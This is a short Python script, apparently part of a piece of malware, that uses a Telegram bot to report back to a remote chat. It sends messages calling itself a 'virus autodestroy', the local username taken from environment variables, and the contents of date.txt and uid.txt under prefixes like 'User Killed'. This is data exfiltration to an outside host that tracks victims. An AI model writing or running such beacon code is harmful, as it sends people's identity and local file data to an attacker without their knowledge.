import asyncio
import os
from telegram import Bot
from datetime import datetime

current_date = datetime.now().strftime("%Y-%m-%d")



async def envoyer_message_telegram(message, chat_id, token):
    bot = Bot(token=token)
    await bot.send_message(chat_id=chat_id, text=message)




async def lire_et_envoyer_contenu_fichier(chat_id, token, filename, message_prefix=""):
    try:
        with open(filename, "r") as file:
            contenu_fichier = file.read()
    except FileNotFoundError:
        contenu_fichier = f"Le fichier {filename} n'a pas été trouvé."

    message_with_content = f"{message_prefix}{contenu_fichier}"
    await envoyer_message_telegram(message_with_content, chat_id, token)



if __name__ == "__main__":
    # Remplacez YOUR_BOT_TOKEN par le token de votre bot Telegram
    token = "YOUR_BOT_TOKEN"

    # Remplacez CHAT_ID par l'identifiant du chat où vous souhaitez envoyer le message
    chat_id = "CHAT_ID"

    # Utilisez os pour obtenir le nom de l'utilisateur
    user = os.getenv('USER') or os.getenv('LOGNAME') or os.getenv('USERNAME')
    
    message1 = f" 🕊️💥"
    message2 = f" virus autodestroy"
    message3 = f"\nCurrent user: {user} \n\n {current_date}"
    message4 = f" 😮‍💨🕊️"

  
    # Lecture et envoi du contenu de date.txt




    # Utilisez asyncio pour exécuter la coroutine
    asyncio.run(envoyer_message_telegram(message1, chat_id, token))
    asyncio.run(envoyer_message_telegram(message2, chat_id, token))
    asyncio.run(envoyer_message_telegram(message3, chat_id, token))
    asyncio.run(lire_et_envoyer_contenu_fichier(chat_id, token, "date.txt", "Autodestroy 💥: "))

    # Lecture et envoi du contenu de uid.txt
    asyncio.run(lire_et_envoyer_contenu_fichier(chat_id, token, "uid.txt", "User Killed 🔪🧑‍🏫🩸: "))
    asyncio.run(envoyer_message_telegram(message4, chat_id, token))
